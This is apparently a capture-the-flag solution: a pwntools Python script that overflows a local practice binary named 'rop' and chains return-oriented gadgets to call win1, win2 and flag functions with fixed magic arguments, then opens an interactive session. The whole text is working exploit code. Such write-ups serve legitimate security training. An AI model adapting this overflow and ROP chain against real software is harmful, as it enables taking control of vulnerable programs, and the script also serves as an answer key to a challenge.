# solve
```py
#!/usr/bin/python3

from pwn import *

elf = context.binary = ELF('./rop')

io = process()

pop_ret= 0x080485d6

ret = 0x080483f6

win1 = 0x080485cb

win2 = 0x080485d8

flag = 0x0804862b

payload = cyclic(28) + pack(win1) + pack(ret) + pack(win2) + pack(pop_ret) + pack(0xbaaaaaad) + pack(flag) + pack(pop_ret)+ pack(0xdeadbaad)

io.sendline(payload)

io.interactive()

```
